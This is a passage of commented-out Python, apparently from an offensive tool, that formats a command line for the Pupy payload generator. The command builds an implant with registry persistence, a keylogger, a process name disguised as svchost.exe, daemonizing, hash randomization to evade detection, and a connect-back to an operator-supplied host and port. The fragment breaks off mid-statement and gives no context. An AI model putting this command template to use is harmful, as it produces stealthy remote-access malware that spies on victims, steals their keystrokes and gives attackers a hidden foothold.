...
#         cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/EZPZ/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
#             Format_Chosen, # 0
#             Operating_System, # 1
#             Architecture_Value, #2
#             Format_Chosen, #3
